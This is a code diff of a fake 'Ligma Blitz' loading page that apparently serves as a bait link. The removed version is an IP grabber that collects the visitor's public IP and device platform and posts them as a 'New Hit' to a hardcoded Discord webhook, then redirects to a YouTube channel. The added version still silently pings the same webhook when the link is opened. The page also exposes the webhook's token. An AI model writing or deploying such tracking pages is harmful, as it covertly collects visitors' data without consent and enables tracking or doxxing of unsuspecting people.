@@ -1,31 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head><title>Ligma Blitz</title></head>
-<body style="background:#000;color:#0f0;text-align:center;font-family:monospace;padding-top:100px;">
-    <h2>[ ACCESSING LIGMA BLITZ ]</h2>
-    <p id="s">Connecting...</p>
-
+<body style="background:#000;color:#0f0;text-align:center;padding-top:100px;font-family:monospace;">
+    <h2>LOADING LIGMA BLITZ...</h2>
     <script>
-        var h = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
-        var y = "https://youtube.com/@LigmaBlox-w7m";
+        var hook = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
 
-        async function log() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const d = await res.json();
-                
-                await fetch(h, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        content: "🎯 **New Hit**\n**IP:** " + d.ip + "\n**Device:** " + navigator.platform
-                    })
-                });
-            } catch(e) {}
-            setTimeout(() => { window.location.href = y; }, 1000);
-        }
-        log();
+        // 1. Tell the webhook WHERE to send and WHAT to say immediately
+        fetch(hook, {
+            method: "POST",
+            mode: "no-cors",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({ content: "🚨 SYSTEM ALERT: The link was clicked! Verification in progress." })
+        });
+
+        // 2. Wait 2 seconds then kick to YouTube
+        setTimeout(function(){
+            window.location.href = "https://youtube.com/@LigmaBlox-w7m";
+        }, 2000);
     </script>
 </body>
 </html>
